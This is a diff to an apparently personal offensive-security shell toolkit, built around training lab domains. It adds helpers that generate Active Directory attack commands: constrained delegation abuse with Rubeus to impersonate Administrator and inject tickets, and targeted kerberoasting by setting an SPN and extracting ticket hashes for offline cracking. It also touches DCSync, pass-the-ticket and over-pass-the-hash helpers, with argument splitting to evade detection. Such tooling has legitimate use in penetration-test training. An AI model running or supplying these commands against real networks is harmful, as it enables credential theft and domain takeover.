@@ -30,8 +30,10 @@ nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus
 nb-ad-pwsh-ptt                 execute pass-the-ticket with Rubeus
 nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
 nb-ad-pwsh-kerberoasting       kerberoasting
+nb-ad-pwsh-kerberoasting-set-spn   targeted kerberoasting with set SPN
 nb-ad-pwsh-unconstrained       unconstrained delegation
-nb-ad-pwsh-constrained         constrained delegation
+nb-ad-pwsh-constrained-user    constrained delegation for user
+nb-ad-pwsh-constrained-machine    constrained delegation for machine
 nb-ad-pwsh-rbcd                resource-based constrained delegation
 
 Privilege Escalation to Enterprise Admins
@@ -57,6 +59,38 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 DOC
 }
 
+nb-ad-pwsh-constrained-user() {
+    __check-project
+    __info "You can check if a domain user allows for constrained delegation with command:"
+    __ok "nb-ad-pwsh-enum-acls"
+    echo
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "s4u"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+    echo
+    __ask "Enter user with constrained delegation enabled"
+    nb-vars-set-user
+    __ask "Enter the AES256 version of user's hash"
+    __check-hash
+    __ask "Enter the msds-allowedtodelegateto ex. CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL"
+    local value && __askvar value VALUE
+
+    __COMMAND="C:\\AD\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:${__USER} /aes256:${__HASH} /impersonateuser:Administrator /msdsspn:\"$value\" /ptt"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command to request a TGS for ${__USER} as the Domain Administrator - Administrator:"
+    __ok "$__COMMAND"
+    echo
+    __info "Check if the TGS is injected:"
+    __ok "klist"
+    echo
+    __info "Try accessing filesystem on $value:"
+    __ok "dir \\\\\\$value\\c\$"
+}
+
 nb-ad-pwsh-unconstrained() {
     __check-project
     __warn "NOTE: the prerequisite for elevation using unconstrained delegation is having admin access shell to the machine."
@@ -66,6 +100,7 @@ nb-ad-pwsh-unconstrained() {
     echo
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "monitor"
+    echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
     echo
@@ -87,6 +122,29 @@ nb-ad-pwsh-unconstrained() {
     __info "Next you need to use command to force authentication to of the DC to the listener machine:"
     __COMMAND2=".\\\\MS-RPRN.exe \\\\\\\\${__RHOST}.${__DOMAIN} \\\\\\\\${ma}.${__DOMAIN}"
     __ok "$__COMMAND2"
+}
+
+nb-ad-pwsh-kerberoasting-set-spn() {
+    __check-project
+    __info "You can enumerate the permissions for Users on ACLs with command:"
+    __ok "nb-ad-pwsh-enum-acls"
+    echo
+    __ask "Enter username which you want to set the SPN to"
+    nb-vars-set-user
+
+    __COMMAND="Set-DomainObject -Identity ${__USER} -Set @{serviceprincipalname=‘dcorp/whatever1'}"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command to set a SPN for the user (must be unique for the domain):"
+    __ok "$__COMMAND"
+    echo
+    __info "Next you need to request TGS hash for offline cracking hashcat:"
+    __COMMAND2="Get-DomainUser -Identity ${__USER} | Get-DomainSPNTicket | select -ExpandProperty Hash"
+    __ok "$__COMMAND2"
+    echo
+    __info "Then use the command to crack it:"
+    __ok "nb-crack-hashcat"
 }
 
 nb-ad-pwsh-enum-acls() {
@@ -118,8 +176,12 @@ nb-ad-pwsh-enum-acls() {
           __COMMAND="Get-DomainUser -SPN";;
         2) 
           echo
-          __info "Enumerate the permissions for RDPUsers on ACLs"
-          __COMMAND="Find-InterestingDomainAcl -ResolveGUIDs | ?{\$_.IdentityReferenceName -match \"RDPUsers\"}";;
+          __warn "Afterwards you can check the user already has a SPN set with command:"
+          __ok "Get-DomainUser -Identity <USERNAME> | select serviceprincipalname"
+          __COMMAND="Find-InterestingDomainAcl -ResolveGUIDs | ?{\$_.IdentityReferenceName -match \"RDPUsers\"}"
+          echo
+          __info "Enumerate the permissions for RDPUsers on ACLs - check the ObjectDN's first 'CN=' value"
+          ;;
         3) 
           echo
           __ask "Enter user to check for DCsync rights"
@@ -166,6 +228,7 @@ nb-ad-pwsh-dcsync() {
 
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "lsadump::dcsync"
+    echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
@@ -185,6 +248,7 @@ nb-ad-pwsh-opth() {
 
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "asktgt"
+    echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
@@ -201,6 +265,7 @@ nb-ad-pwsh-ptt() {
 
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "ptt"
+    echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
